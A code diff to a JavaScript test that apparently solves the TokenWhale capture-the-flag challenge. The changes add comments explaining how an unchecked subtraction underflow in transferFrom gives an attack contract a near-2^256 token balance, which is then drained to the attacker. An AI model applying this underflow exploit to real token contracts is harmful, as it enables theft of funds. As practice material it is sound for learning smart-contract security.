@@ -28,26 +28,26 @@ describe('TokenWhaleChallenge', () => {
   });
 
   it('exploit', async () => {
-    console.log("Deployer balance: ", await target.balanceOf(deployer.address));
-    console.log("Attacker balance: ", await target.balanceOf(attacker.address));
-    console.log("Attack Contract balance: ", await target.balanceOf(attackContract.address));
+    //Starting balance of 3 addresses
     expect(await target.balanceOf(deployer.address)).to.equal(0);
     expect (await target.balanceOf(attacker.address)).to.equal(1000);
     expect (await target.balanceOf(attackContract.address)).to.equal(0);
-
+    //Attacker approves the attackContract to transfer their tokens
     let approveTx = await target.approve(attackContract.address, 1000);
     await approveTx.wait();
-    console.log("Allowance of Attack Contract: ", await target.allowance(attacker.address, attackContract.address));
     expect (await target.allowance(attacker.address, attackContract.address)).to.equal(1000);
 
+    //transferFrom calls _transfer, which doesn't check balanceOf[msg.sender]-=value, which causes an underflow
     let attackTx = await attackContract.attack(attacker.address, deployer.address, 1000);
     await attackTx.wait();
+    //Since we call TokenWhaleChallenge from a separate contract, attacker's balance was never touched
+    expect(await target.balanceOf(deployer.address)).to.equal(1000);
+    expect (await target.balanceOf(attacker.address)).to.equal(1000);
+    expect(await target.balanceOf(attackContract.address)).to.equal("115792089237316195423570985008687907853269984665640564039457584007913129638936");
 
-    console.log("Attack Contract balance after attack: ", await target.balanceOf(attackContract.address));
-
+    //We now have a lot of tokens to send to attacker address
     let transferTx = await attackContract.transfer(attacker.address, 999000);
     await transferTx.wait();
-
     expect(await target.isComplete()).to.equal(true);
   });
 });
